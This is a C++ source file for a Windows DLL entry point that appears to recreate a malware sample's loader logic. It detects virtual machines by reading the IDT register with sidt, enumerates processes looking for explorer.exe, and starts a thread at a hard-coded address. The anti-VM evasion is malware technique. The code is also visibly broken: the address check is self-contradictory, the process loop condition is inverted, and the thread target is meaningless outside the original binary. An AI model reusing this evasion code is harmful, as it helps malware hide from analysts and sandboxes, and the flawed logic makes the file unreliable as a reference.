#include <windows.h>        // windows API
#include <Tlhelp32.h>	    // CreateToolHelp32Snapshot
#include <iostream>	    	// Debug purposes

struct IDTR{				// struct rappresenting IDT register
	WORD  limit;
	DWORD64 base;
};

BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason,LPVOID lpvReserved){
    
	IDTR idt;					// holds IDTR's state
	HANDLE snapshot_taken;				// will hold a snapshot
	PROCESSENTRY32 process;

	// PROCESSENTRY32 INITIALIZATION
	memset(&process, 0, sizeof(PROCESSENTRY32));
	process.dwSize = sizeof(process);

	// Checking IDTR's state
    __asm__ volatile( "sidt %0" : "=m" (idt) ); 
  
	std::cout << "Limit:\t" << std::hex << idt.limit << "\n";
	std::cout << "Base:\t" << std::hex << idt.base << std::endl;
	
	if (0x8003F400 < idt.base && idt.base > 0x80047400) {
	// invalid addresses are a result of either the system being broken
	// or being virtualized, hence , this is a anti-vm techinque	  
			std::cout << "ret 1" << std::endl;
        		return false;
	}
	
	/* A snapshot of the system is about to be taken */
    if ((snapshot_taken = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0))
												== INVALID_HANDLE_VALUE) {
			return false;
	}

	std::cout << "Snapshot taken" << std::endl;
	
	// If at least 1 process descriptor was copied successfully we can try loop over
	// every process in the snapshot looking for explorer.exe

	if (Process32First(snapshot_taken, &process) == 0) {
		while (Process32Next(snapshot_taken, &process)) {
			if ( strcmp(process.szExeFile, "explorer.exe") == 0 ) {
				if (process.th32ParentProcessID == process.th32ProcessID) {
						return false;
				}
				// line 74
				if (fdwReason == 0)	{
						return false;
				}
				// line 85
				if (fdwReason == DLL_THREAD_DETACH ||
					fdwReason == DLL_THREAD_ATTACH) {
						return true;
				}				
			}
		}

		if (process.th32ParentProcessID == process.th32ProcessID) {
				return false;
		}
		CreateThread(0,0,(LPTHREAD_START_ROUTINE) 0x100032D0,0,0,0);

		if (fdwReason == DLL_THREAD_DETACH || fdwReason == DLL_THREAD_ATTACH) {
				return true;
		} 		
	}
}
